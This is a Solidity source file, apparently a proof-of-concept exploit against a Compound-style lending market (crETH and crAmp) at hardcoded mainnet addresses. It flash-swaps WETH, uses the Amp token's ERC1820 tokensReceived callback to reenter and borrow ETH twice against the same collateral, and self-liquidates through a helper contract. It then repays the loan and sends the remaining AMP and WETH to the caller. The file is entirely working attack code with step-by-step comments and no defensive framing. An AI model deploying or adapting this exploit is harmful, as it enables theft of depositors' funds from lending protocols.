pragma solidity ^0.8.0;

contract Exploit {

    address constant cEther = 0xD06527D5e56A3495252A528C4987003b712860eE;
    address constant cAmpDelegator = 0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6;
    address constant ampToken = 0xfF20817765cB7f73d4bde2e66e067E58D11095C2;
    address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    // begin the exploit
    function start() public {
        // Step 1: Set implementer in ERC1820 Registry,
        // which is needed for Amp token callback
        address registry = 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24;
        registry.call( abi.encodeWithSignature(
            "setInterfaceImplementer(address,bytes32,address)",
            address(this),
            0xfa352d6368bbc643bcf9d528ffaba5dd3e826137bc42f935045c6c227bd4c72a,
            address(this)) );

        // Step 2: Flash swap for 500 WETH from WETH/WISE pool
        address pair = 0x21b8065d10f73EE2e260e5B47D3344d3Ced7596E;
        pair.call( abi.encodeWithSignature(
            "swap(uint256,uint256,address,bytes)",
            0,
            500 ether,
            address(this),
            hex'00') );

        // Step 14: Send tokens to attacker 
        ampToken.call ( abi.encodeWithSignature(
            "transfer(address,uint256)",
            msg.sender,
            9740000 ether) );
        (,bytes memory result) = weth.call(abi.encodeWithSignature(
            "balanceOf(address)", address(this)) );
        uint bal;
        assembly {
            bal := mload(add(result, 0x20))
        }
        weth.call( abi.encodeWithSignature(
            "transfer(address,uint256)",
            msg.sender,
            bal) );
    }

    // callback after receiving the flashswap
    function uniswapV2Call(address, uint256 amount0Out, uint256 amount1Out, bytes calldata) public {
        // Step 3: approve and unwrap WETH
        weth.call( abi.encodeWithSignature(
            "approve(address,uint256)",
            cAmpDelegator,
            -1) );
        weth.call( abi.encodeWithSignature(
            "withdraw(uint256)",
            500 ether) );

        // Step 4: mint crETH
        cEther.call{value: 500 ether}(abi.encodeWithSignature("mint()"));

        // Step 5: enter market to initiate borrows with crETH collateral
        address unitroller = 0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258;
        address[] memory addr = new address[](1);
        addr[0] = cEther;
        unitroller.call( abi.encodeWithSignature(
            "enterMarkets(address[])",
            addr) );

        // Step 6: borrow crAmp tokens (delegator is wrapper for Amp)
        cAmpDelegator.call( abi.encodeWithSignature(
            "borrow(uint256)",
            19480000 ether) );

        // Step 8: create new contract to liquidate borrow
        Liquidator liquidator = new Liquidator();

        // Step 9: transfer half of our Amp tokens so that 
        // this contract can be liquidated
        ampToken.call ( abi.encodeWithSignature(
            "transfer(address,uint256)",
            address(liquidator),
            9740000 ether) );

        // Step 10: initiate liquidation
        liquidator.liquidate(9740000 ether);

        // Step 13: convert borrowed ETH from step 7 to WETH
        // and repay flash loan with fee (3/997 * borrow amount) 
        weth.call{value: 355 ether}('');
        weth.call( abi.encodeWithSignature(
            "transfer(address,uint256)",
            msg.sender, // pair address
            501.505 ether) );
    }

    // callback when this contract receives Amp tokens
    function tokensReceived(
        bytes4 functionSig,
        bytes32 partition,
        address operator,
        address from,
        address to,
        uint256 value,
        bytes calldata data,
        bytes calldata operatorData
    ) external {
        // Step 7: borrow ETH when we receive the crAmp
        cEther.call( abi.encodeWithSignature(
            "borrow(uint256)",
            355 ether) );
    }

    receive() external payable {}

}

contract Liquidator {
    address constant cEther = 0xD06527D5e56A3495252A528C4987003b712860eE;
    address constant cAmpDelegator = 0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6;
    address constant ampToken = 0xfF20817765cB7f73d4bde2e66e067E58D11095C2;
    address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    function liquidate(uint amount) external {
        ampToken.call( abi.encodeWithSignature(
            "approve(address,uint256)",
            cAmpDelegator,
            -1) );

        // Step 11: send the Amp to borrow contract
        // to pay off loan, and receive the crETH collateral in return
        cAmpDelegator.call( abi.encodeWithSignature(
            "liquidateBorrow(address,uint256,address)",
            msg.sender, // borrower
            amount,
            cEther // collateral
        ) );

        // Step 12: redeem the crETH for ETH (and then WETH)
        (,bytes memory r1) = cEther.call(abi.encodeWithSignature(
            "balanceOf(address)", address(this)) );
        uint cEthBalance;
        assembly {
            // first byte of result is length 
            cEthBalance := mload(add(r1, 0x20))
        }
        cEther.call(abi.encodeWithSignature("redeem(uint256)", cEthBalance));
        // swap ETH for WETH
        uint ethBalance = address(this).balance;
        weth.call{value: ethBalance}('');
        // transfer the WETH back to caller so we can repay flash loan
        weth.call( abi.encodeWithSignature(
            "transfer(address,uint256)",
            msg.sender,
            ethBalance) );

        // destroy
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {}

}
